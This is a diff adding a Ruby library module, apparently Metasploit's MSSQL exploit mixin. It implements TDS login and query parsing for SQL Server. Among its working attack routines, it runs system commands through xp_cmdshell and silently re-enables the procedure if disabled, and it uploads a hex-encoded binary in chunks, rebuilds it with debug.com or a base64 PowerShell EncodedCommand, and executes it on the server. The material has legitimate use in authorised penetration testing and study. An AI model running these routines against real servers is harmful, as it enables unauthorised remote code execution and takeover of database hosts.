@@ -1,0 +1,687 @@
+require 'msf/core'
+require 'msf/core/exploit/mssql_commands'
+
+module Msf
+
+###
+#
+# This module exposes methods for querying a remote MSSQL service
+#
+###
+module Exploit::Remote::MSSQL
+
+	include Exploit::Remote::MSSQL_COMMANDS
+	include Exploit::Remote::Udp
+	include Exploit::Remote::Tcp
+
+	#
+	# Creates an instance of a MSSQL exploit module.
+	#
+	def initialize(info = {})
+		super
+
+		# Register the options that all MSSQL exploits may make use of.
+		register_options(
+			[
+				Opt::RHOST,
+				Opt::RPORT(1433),
+				OptString.new('USERNAME', [ false, 'The username to authenticate as', 'sa']),
+				OptString.new('PASSWORD', [ false, 'The password for the specified username', '']),
+			], Msf::Exploit::Remote::MSSQL)
+		register_advanced_options(
+			[
+				OptPath.new('HEX2BINARY',   [ false, "The path to the hex2binary script on the disk",
+					File.join(Msf::Config.install_root, "data", "exploits", "mssql", "h2b")
+				])
+			], Msf::Exploit::Remote::MSSQL)
+
+		register_autofilter_ports([ 1433, 1434, 1435, 14330, 2533, 9152, 2638 ])
+		register_autofilter_services(%W{ ms-sql-s ms-sql2000 sybase })
+	end
+
+
+	#
+	# This method sends a UDP query packet to the server and
+	# parses out the reply packet into a hash
+	#
+	def mssql_ping(timeout=5)
+		data = { }
+
+		ping_sock = Rex::Socket::Udp.create(
+			'PeerHost'  => rhost,
+			'PeerPort'  => 1434,
+			'Context'   =>
+				{
+					'Msf'        => framework,
+					'MsfExploit' => self,
+				})
+
+
+		ping_sock.put("\x02")
+		resp, saddr, sport = ping_sock.recvfrom(65535, timeout)
+		ping_sock.close
+
+		return data if not resp
+		return data if resp.length == 0
+
+		var = nil
+
+		return mssql_ping_parse(resp)
+	end
+
+	#
+	# Parse a 'ping' response and format as a hash
+	#
+	def mssql_ping_parse(data)
+		res = {}
+		var = nil
+		idx = data.index('ServerName')
+		return res if not idx
+
+		data[idx, data.length-idx].split(';').each do |d|
+			if (not var)
+				var = d
+			else
+				if (var.length > 0)
+					res[var] = d
+					var = nil
+				end
+			end
+		end
+
+		return res
+	end
+
+	#
+	# Execute a system command via xp_cmdshell
+	#
+	def mssql_xpcmdshell(cmd,doprint=false,opts={})
+		force_enable = false
+		begin
+			res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", false, opts)
+			if(res[:errors] and not res[:errors].empty?)
+				if(res[:errors].join =~ /xp_cmdshell/)
+					if(force_enable)
+						print_error("The xp_cmdshell procedure is not available and could not be enabled")
+						raise  RuntimeError, "Failed to execute command"
+					else
+						print_status("The server may have xp_cmdshell disabled, trying to enable it...")
+						mssql_query(mssql_xpcmdshell_enable())
+						raise RuntimeError, "xp_cmdshell disabled"
+					end
+				end
+			end
+
+			mssql_print_reply(res) if doprint
+
+			return res
+
+		rescue RuntimeError => e
+			if(e.to_s =~ /xp_cmdshell disabled/)
+				force_enable = true
+				retry
+			end
+			raise e
+		end
+	end
+
+	#
+	# Upload and execute a Windows binary through MSSQL queries
+	#
+	def mssql_upload_exec(exe, debug=false)
+		hex = exe.unpack("H*")[0]
+
+		var_bypass  = rand_text_alpha(8)
+		var_payload = rand_text_alpha(8)
+
+		print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+		print_status("Writing the debug.com loader to the disk...")
+		h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+		h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+		h2b.split(/\n/).each do |line|
+			mssql_xpcmdshell("#{line}", false)
+		end
+
+		print_status("Converting the debug script to an executable...")
+		mssql_xpcmdshell("cmd.exe /c cd %TEMP% && cd %TEMP% && debug < %TEMP%\\#{var_bypass}", debug)
+		mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)
+
+		print_status("Uploading the payload, please be patient...")
+		idx = 0
+		cnt = 500
+		while(idx < hex.length - 1)
+			mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false)
+			idx += cnt
+		end
+
+		print_status("Converting the encoded payload...")
+		mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
+		mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
+		mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+
+		print_status("Executing the payload...")
+		mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+	end
+
+
+	#
+	# Upload and execute a Windows binary through MSSQL queries and Powershell
+	#
+	def powershell_upload_exec(exe, debug=false)
+
+		# hex converter
+		hex = exe.unpack("H*")[0]
+		# create random alpha 8 character names
+		#var_bypass  = rand_text_alpha(8)
+		var_payload = rand_text_alpha(8)
+		print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+		# our payload converter, grabs a hex file and converts it to binary for us through powershell
+		h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
+		h2b_unicode=Rex::Text.to_unicode(h2b)
+		# base64 encode it, this allows us to perform execution through powershell without registry changes
+		h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
+		print_status("Uploading the payload #{var_payload}, please be patient...")
+		idx = 0
+		cnt = 500
+		while(idx < hex.length - 1)
+			mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false)
+			idx += cnt
+		end
+		print_status("Converting the payload utilizing PowerShell EncodedCommand...")
+		mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
+		mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+		print_status("Executing the payload...")
+		mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+		print_status("Be sure to cleanup #{var_payload}.exe...")
+	end
+
+	#
+	# Send and receive using TDS
+	#
+	def mssql_send_recv(req, timeout=15)
+		sock.put(req)
+
+		# Read the 8 byte header to get the length and status
+		# Read the length to get the data
+		# If the status is 0, read another header and more data
+
+		done = false
+		resp = ""
+
+		while(not done)
+			head = sock.get_once(8, timeout)
+			if !(head and head.length == 8)
+				return false
+			end
+
+			# Is this the last buffer?
+			if(head[1,1] == "\x01")
+				done = true
+			end
+
+			# Grab this block's length
+			rlen = head[2,2].unpack('n')[0] - 8
+
+			while(rlen > 0)
+				buff = sock.get_once(rlen, timeout)
+				return if not buff
+				resp << buff
+				rlen -= buff.length
+			end
+		end
+
+		resp
+	end
+
+	#
+	# Encrypt a password according to the TDS protocol (encode)
+	#
+	def mssql_tds_encrypt(pass)
+		# Convert to unicode, swap 4 bits both ways, xor with 0xa5
+		Rex::Text.to_unicode(pass).unpack('C*').map {|c| (((c & 0x0f) << 4) + ((c & 0xf0) >> 4)) ^ 0xa5 }.pack("C*")
+	end
+
+	#
+	# This method connects to the server over TCP and attempts
+	# to authenticate with the supplied username and password
+	# The global socket is used and left connected after auth
+	#
+	def mssql_login(user='sa', pass='', db='')
+
+		disconnect if self.sock
+		connect
+
+		pkt = ""
+		idx = 0
+
+		pkt << [
+			0x00000000,   # Dummy size
+			0x71000001,   # TDS Version
+			0x00000000,   # Size
+			0x00000007,   # Version
+			rand(1024+1), # PID
+			0x00000000,   # ConnectionID
+			0xe0,         # Option Flags 1
+			0x03,         # Option Flags 2
+			0x00,         # SQL Type Flags
+			0x00,         # Reserved Flags
+			0x00000000,   # Time Zone
+			0x00000000    # Collation
+		].pack('VVVVVVCCCCVV')
+
+
+		cname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
+		uname = Rex::Text.to_unicode( user )
+		pname = mssql_tds_encrypt( pass )
+		aname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
+		sname = Rex::Text.to_unicode( rhost )
+		dname = Rex::Text.to_unicode( db )
+
+		idx = pkt.size + 50 # lengths below
+
+		pkt << [idx, cname.length / 2].pack('vv')
+		idx += cname.length
+
+		pkt << [idx, uname.length / 2].pack('vv')
+		idx += uname.length
+
+		pkt << [idx, pname.length / 2].pack('vv')
+		idx += pname.length
+
+		pkt << [idx, aname.length / 2].pack('vv')
+		idx += aname.length
+
+		pkt << [idx, sname.length / 2].pack('vv')
+		idx += sname.length
+
+		pkt << [0, 0].pack('vv')
+
+		pkt << [idx, aname.length / 2].pack('vv')
+		idx += aname.length
+
+		pkt << [idx, 0].pack('vv')
+
+		pkt << [idx, dname.length / 2].pack('vv')
+		idx += dname.length
+
+		# The total length has to be embedded twice more here
+		pkt << [
+			0,
+			0,
+			0x12345678,
+			0x12345678
+		].pack('vVVV')
+
+		pkt << cname
+		pkt << uname
+		pkt << pname
+		pkt << aname
+		pkt << sname
+		pkt << aname
+		pkt << dname
+
+		# Total packet length
+		pkt[0,4] = [pkt.length].pack('V')
+
+		# Embedded packet lengths
+		pkt[pkt.index([0x12345678].pack('V')), 8] = [pkt.length].pack('V') * 2
+
+		# Packet header and total length including header
+		pkt = "\x10\x01" + [pkt.length + 8].pack('n') + [0].pack('n') + [1].pack('C') + "\x00" + pkt
+
+		resp = mssql_send_recv(pkt)
+
+		info = {:errors => []}
+		info = mssql_parse_reply(resp,info)
+
+		return false if not info
+		info[:login_ack] ? true : false
+	end
+
+	#
+	# Login to the SQL server using the standard USERNAME/PASSWORD options
+	#
+	def mssql_login_datastore(db='')
+		mssql_login(datastore['USERNAME'], datastore['PASSWORD'], db)
+	end
+
+	#
+	# Issue a SQL query using the TDS protocol
+	#
+	def mssql_query(sqla, doprint=false, opts={})
+		info = { :sql => sqla }
+
+		opts[:timeout] ||= 15
+
+		pkts = []
+		idx  = 0
+
+		bsize = 4096 - 8
+		chan  = 0
+
+		@cnt ||= 0
+		@cnt += 1
+
+		sql = Rex::Text.to_unicode(sqla)
+		while(idx < sql.length)
+			buf = sql[idx, bsize]
+			flg = buf.length < bsize ? "\x01" : "\x00"
+			pkts << "\x01" + flg + [buf.length + 8].pack('n') + [chan].pack('n') + [@cnt].pack('C') + "\x00" + buf
+			idx += bsize
+
+		end
+
+		resp = mssql_send_recv(pkts.join, opts[:timeout])
+		mssql_parse_reply(resp, info)
+		mssql_print_reply(info) if doprint
+		info
+	end
+
+
+	#
+	# Nicely print the results of a SQL query
+	#
+	def mssql_print_reply(info)
+
+		print_status("SQL Query: #{info[:sql]}")
+
+		if(info[:done] and info[:done][:rows].to_i > 0)
+			print_status("Row Count: #{info[:done][:rows]} (Status: #{info[:done][:status]} Command: #{info[:done][:cmd]})")
+		end
+
+		if(info[:errors] and not info[:errors].empty?)
+			info[:errors].each do |err|
+				print_error(err)
+			end
+		end
+
+		if(info[:rows] and not info[:rows].empty?)
+
+			tbl = Rex::Ui::Text::Table.new(
+				'Indent'  => 1,
+				'Header'  => "",
+				'Columns' => info[:colnames]
+			)
+
+			info[:rows].each do |row|
+				tbl << row
+			end
+
+			print_line(tbl.to_s)
+		end
+	end
+
+
+	#
+	# Parse a raw TDS reply from the server
+	#
+	def mssql_parse_tds_reply(data, info)
+		info[:errors] ||= []
+		info[:colinfos] ||= []
+		info[:colnames] ||= []
+
+		# Parse out the columns
+		cols = data.slice!(0,2).unpack('v')[0]
+		0.upto(cols-1) do |col_idx|
+			col = {}
+			info[:colinfos][col_idx] = col
+
+			col[:utype] = data.slice!(0,2).unpack('v')[0]
+			col[:flags] = data.slice!(0,2).unpack('v')[0]
+			col[:type]  = data.slice!(0,1).unpack('C')[0]
+
+			case col[:type]
+			when 48
+				col[:id] = :tinyint
+
+			when 52
+				col[:id] = :smallint
+
+			when 56
+				col[:id] = :rawint
+
+			when 61
+				col[:id] = :datetime
+
+			when 34
+				col[:id]            = :image
+				col[:max_size]      = data.slice!(0,4).unpack('V')[0]
+				col[:value_length]  = data.slice!(0,2).unpack('v')[0]
+				col[:value]         = data.slice!(0, col[:value_length]  * 2).gsub("\x00", '')
+
+			when 36
+				col[:id] = :string
+
+			when 38
+				col[:id] = :int
+				col[:int_size] = data.slice!(0,1).unpack('C')[0]
+
+			when 127
+				col[:id] = :bigint
+
+			when 165
+				col[:id] = :hex
+				col[:max_size] = data.slice!(0,2).unpack('v')[0]
+
+			when 173
+				col[:id] = :hex # binary(2)
+				col[:max_size] = data.slice!(0,2).unpack('v')[0]
+
+			when 231,175,167,239
+				col[:id] = :string
+				col[:max_size] = data.slice!(0,2).unpack('v')[0]
+				col[:codepage] = data.slice!(0,2).unpack('v')[0]
+				col[:cflags] = data.slice!(0,2).unpack('v')[0]
+				col[:charset_id] =  data.slice!(0,1).unpack('C')[0]
+
+			else
+				col[:id] = :unknown
+			end
+
+			col[:msg_len] = data.slice!(0,1).unpack('C')[0]
+
+			if(col[:msg_len] and col[:msg_len] > 0)
+				col[:name] = data.slice!(0, col[:msg_len] * 2).gsub("\x00", '')
+			end
+			info[:colnames] << (col[:name] || 'NULL')
+		end
+	end
+
+	#
+	# Parse individual tokens from a TDS reply
+	#
+	def mssql_parse_reply(data, info)
+		info[:errors] = []
+		return if not data
+		until data.empty?
+			token = data.slice!(0,1).unpack('C')[0]
+			case token
+			when 0x81
+				mssql_parse_tds_reply(data, info)
+			when 0xd1
+				mssql_parse_tds_row(data, info)
+			when 0xe3
+				mssql_parse_env(data, info)
+			when 0x79
+				mssql_parse_ret(data, info)
+			when 0xfd, 0xfe, 0xff
+				mssql_parse_done(data, info)
+			when 0xad
+				mssql_parse_login_ack(data, info)
+			when 0xab
+				mssql_parse_info(data, info)
+			when 0xaa
+				mssql_parse_error(data, info)
+			when nil
+				break
+			else
+				info[:errors] << "unsupported token: #{token}"
+			end
+		end
+		info
+	end
+
+	#
+	# Parse a single row of a TDS reply
+	#
+	def mssql_parse_tds_row(data, info)
+		info[:rows] ||= []
+		row = []
+
+		info[:colinfos].each do |col|
+
+			if(data.length == 0)
+				row << "<EMPTY>"
+				next
+			end
+
+			case col[:id]
+			when :hex
+				str = ""
+				len = data.slice!(0,2).unpack('v')[0]
+				if(len > 0 and len < 65535)
+					str << data.slice!(0,len)
+				end
+				row << str.unpack("H*")[0]
+
+			when :string
+				str = ""
+				len = data.slice!(0,2).unpack('v')[0]
+				if(len > 0 and len < 65535)
+					str << data.slice!(0,len)
+				end
+				row << str.gsub("\x00", '')
+
+			when :datetime
+				row << data.slice!(0,8).unpack("H*")[0]
+
+			when :rawint
+				row << data.slice!(0,4).unpack('V')[0]
+
+			when :bigint
+				row << data.slice!(0,8).unpack("H*")[0]
+
+			when :smallint
+				row << data.slice!(0, 2).unpack("v")[0]
+
+			when :smallint3
+				row << [data.slice!(0, 3)].pack("Z4").unpack("V")[0]
+
+			when :tinyint
+				row << data.slice!(0, 1).unpack("C")[0]
+
+			when :image
+				str = ''
+				len = data.slice!(0,1).unpack('C')[0]
+				str = data.slice!(0,len) if (len and len > 0)
+				row << str.unpack("H*")[0]
+
+			when :int
+				len = data.slice!(0, 1).unpack("C")[0]
+				raw = data.slice!(0, len) if (len and len > 0)
+
+				case len
+				when 0,255
+					row << ''
+				when 1
+					row << raw.unpack("C")[0]
+				when 2
+					row << raw.unpack('v')[0]
+				when 4
+					row << raw.unpack('V')[0]
+				when 5
+					row << raw.unpack('V')[0] # XXX: missing high byte
+				when 8
+					row << raw.unpack('VV')[0] # XXX: missing high dword
+				else
+					info[:errors] << "invalid integer size: #{len} #{data[0,16].unpack("H*")[0]}"
+				end
+			else
+				info[:errors] << "unknown column type: #{col.inspect}"
+			end
+		end
+
+		info[:rows] << row
+		info
+	end
+
+	#
+	# Parse a "ret" TDS token
+	#
+	def mssql_parse_ret(data, info)
+		ret = data.slice!(0,4).unpack('N')[0]
+		info[:ret] = ret
+		info
+	end
+
+	#
+	# Parse a "done" TDS token
+	#
+	def mssql_parse_done(data, info)
+		status,cmd,rows = data.slice!(0,8).unpack('vvV')
+		info[:done] = { :status => status, :cmd => cmd, :rows => rows }
+		info
+	end
+
+	#
+	# Parse an "error" TDS token
+	#
+	def mssql_parse_error(data, info)
+		len  = data.slice!(0,2).unpack('v')[0]
+		buff = data.slice!(0,len)
+
+		errno,state,sev,elen = buff.slice!(0,8).unpack('VCCv')
+		emsg = buff.slice!(0,elen * 2)
+		emsg.gsub!("\x00", '')
+
+		info[:errors] << "SQL Server Error ##{errno} (State:#{state} Severity:#{sev}): #{emsg}"
+		info
+	end
+
+	#
+	# Parse an "environment change" TDS token
+	#
+	def mssql_parse_env(data, info)
+		len  = data.slice!(0,2).unpack('v')[0]
+		buff = data.slice!(0,len)
+		type = buff.slice!(0,1).unpack('C')[0]
+
+		nval = ''
+		nlen = buff.slice!(0,1).unpack('C')[0] || 0
+		nval = buff.slice!(0,nlen*2).gsub("\x00", '') if nlen > 0
+
+		oval = ''
+		olen = buff.slice!(0,1).unpack('C')[0] || 0
+		oval = buff.slice!(0,olen*2).gsub("\x00", '') if olen > 0
+
+		info[:envs] ||= []
+		info[:envs] << { :type => type, :old => oval, :new => nval }
+		info
+	end
+
+	#
+	# Parse an "information" TDS token
+	#
+	def mssql_parse_info(data, info)
+		len  = data.slice!(0,2).unpack('v')[0]
+		buff = data.slice!(0,len)
+
+		errno,state,sev,elen = buff.slice!(0,8).unpack('VCCv')
+		emsg = buff.slice!(0,elen * 2)
+		emsg.gsub!("\x00", '')
+
+		info[:infos]||= []
+		info[:infos] << "SQL Server Info ##{errno} (State:#{state} Severity:#{sev}): #{emsg}"
+		info
+	end
+
+	#
+	# Parse a "login ack" TDS token
+	#
+	def mssql_parse_login_ack(data, info)
+		len  = data.slice!(0,2).unpack('v')[0]
+		buff = data.slice!(0,len)
+		info[:login_ack] = true
+	end
+end
+end
